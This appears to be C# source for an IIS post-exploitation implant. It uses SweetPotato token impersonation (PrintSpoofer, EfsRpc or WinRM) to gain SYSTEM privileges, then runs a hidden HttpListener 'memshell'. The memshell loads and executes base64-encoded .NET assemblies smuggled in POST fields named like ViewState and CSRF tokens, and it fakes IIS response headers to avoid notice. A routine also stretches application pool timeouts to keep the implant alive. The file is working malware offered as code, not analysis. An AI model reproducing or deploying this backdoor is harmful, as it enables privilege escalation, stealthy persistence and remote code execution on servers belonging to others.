using System;
using System.Text;
using System.Threading;
using static SweetPotato.ImpersonationToken;
using SweetPotato;
using Microsoft.Win32.SafeHandles;
using System.IO;
using System.Net;
using System.Web;
using System.Threading.Tasks;
using Microsoft.Web.Administration;
using System.Web.Hosting;
using System.Linq;
using System.Collections.Generic;

namespace SystemIIS
{
    class HTTPListener
    {
        private string result = "";
        public string secret_url;
        public string GetResult()
        {
            return this.result;
        }

        public HTTPListener(string su)
        {
            secret_url = su;
            string clsId = "4991D34B-80A1-4291-83B6-3328366B9097";
            ushort port = 6666;
            PotatoAPI.Mode mode = PotatoAPI.Mode.PrintSpoofer;


            try
            {
                bool hasImpersonate = EnablePrivilege(SecurityEntity.SE_IMPERSONATE_NAME);
                bool hasPrimary = EnablePrivilege(SecurityEntity.SE_ASSIGNPRIMARYTOKEN_NAME);
                bool hasIncreaseQuota = EnablePrivilege(SecurityEntity.SE_INCREASE_QUOTA_NAME);

                if (!hasImpersonate && !hasPrimary)
                {
                    result = "necessary privileges missing";
                    return;
                }

                mode = PotatoAPI.Mode.PrintSpoofer;

                PotatoAPI potatoAPI = new PotatoAPI(new Guid(clsId), port, mode);

                if (!potatoAPI.Trigger())
                {
                    mode = PotatoAPI.Mode.EfsRpc;
                    potatoAPI = new PotatoAPI(new Guid(clsId), port, mode);
                    if (!potatoAPI.Trigger())
                    {
                        mode = PotatoAPI.Mode.WinRM;
                        potatoAPI = new PotatoAPI(new Guid(clsId), port, mode);
                        if (!potatoAPI.Trigger())
                        {
                            result = "Spooler: failed | EfsRPC: failed | WinRM: failed";
                            return;
                        }
                    }
                }
                // config IIS and start HttpListener memshell
                Task.Run(() =>
                {
                    //System.Security.Principal.WindowsIdentity.RunImpersonated(new SafeAccessTokenHandle(potatoAPI.Token), ConfigIIS);
                    System.Security.Principal.WindowsIdentity.RunImpersonated(new SafeAccessTokenHandle(potatoAPI.Token), StartHttpListener2);
                });
                Thread.Sleep(3000);
                result = "OKE";

            }
            catch (Exception e)
            {
                result = e.Message;
            }
        }

        private static void ConfigIIS()
        {
            ServerManager serverManager = new ServerManager();
            // Get the current application's virtual directory
            string appPath = HostingEnvironment.ApplicationVirtualPath;
            string siteName = HostingEnvironment.SiteName;
            var site = serverManager.Sites.FirstOrDefault(s => s.Name == siteName);
            var application = site.Applications.FirstOrDefault(app => app.Path == appPath);
            string appPoolName = application.ApplicationPoolName;
            ApplicationPool appPool = serverManager.ApplicationPools[appPoolName];
            //Recycling time
            appPool.Recycling.PeriodicRestart.Time = TimeSpan.FromMinutes(60*29);

            //idletime out
            appPool.ProcessModel.IdleTimeout = TimeSpan.FromMinutes(60 * 2);
            serverManager.CommitChanges();

        }

        public static Dictionary<string, string> parse_post(HttpListenerRequest request)
        {
            var post_raw_data = new StreamReader(request.InputStream, request.ContentEncoding).ReadToEnd();
            Dictionary<string, string> postParams = new Dictionary<string, string>();
            string[] rawParams = post_raw_data.Split('&');
            foreach (string param in rawParams)
            {
                string[] kvPair = param.Split('=');
                string p_key = kvPair[0];
                string value = HttpUtility.UrlDecode(kvPair[1]);
                postParams.Add(p_key, value);
            }
            return postParams;
        }
        public static void SetRespHeader(HttpListenerResponse resp)
        {
            resp.Headers.Set(HttpResponseHeader.Server, "Microsoft-IIS/10.0");
            resp.Headers.Set(HttpResponseHeader.ContentType, "text/html; charset=utf-8");
            resp.Headers.Add("X-Aspnet-Version", "4.0.30319");
            resp.Headers.Add("X-Powered-By", "ASP.NET");
        }

        public void StartHttpListener2()
        {
            HttpListener listener = new HttpListener();
            listener.Prefixes.Add(secret_url);
            listener.Start();
            while (true)
            {
                HttpListenerContext context = listener.GetContext();
                HttpListenerRequest request = context.Request;
                HttpListenerResponse response = context.Response;
                SetRespHeader(response);
                Stream stm = null;
                try
                {
                    if (request.Headers["x"] == "load")
                    {
                        Dictionary<string, string> postParams = parse_post(request);
                        string dll_data = postParams["__VIEWSTATES"];
                        string class_name = postParams["_CSRFToken"];
                        object obj = System.Reflection.Assembly.Load(Convert.FromBase64String(dll_data)).CreateInstance(class_name);
                        string r = (string)obj.GetType().GetMethod("GetResult").Invoke(obj.GetType().GetConstructor(Type.EmptyTypes).Invoke(new object[] { }), new object[] { });
                        byte[] output = Encoding.UTF8.GetBytes(r);
                        response.StatusCode = 200;
                        response.ContentLength64 = output.Length;
                        stm = response.OutputStream;
                        stm.Write(output, 0, output.Length);
                        stm.Close();
                    }
                    if (request.Headers["ping"] == "pong")
                    {
                        byte[] output = Encoding.UTF8.GetBytes("OK, woot woot !");
                        response.StatusCode = 200;
                        response.ContentLength64 = output.Length;
                        stm = response.OutputStream;
                        stm.Write(output, 0, output.Length);
                        stm.Close();
                    }
                    if (request.Headers["x"] == "stop")
                    {
                        if (listener.IsListening)
                        {
                            listener.Stop();
                            byte[] output = Encoding.UTF8.GetBytes("Terminated");
                            response.StatusCode = 200;
                            response.ContentLength64 = output.Length;
                            stm = response.OutputStream;
                            stm.Write(output, 0, output.Length);
                            stm.Close();
                        }
                    }


                }
                catch (Exception ex)
                {
                    listener.Stop();
                }
                finally
                {
                    if (stm != null)
                    {
                        stm.Flush();
                        stm.Close();
                    }
                    response.OutputStream.Flush();
                    response.OutputStream.Close();
                }
            }

        }
    }
}
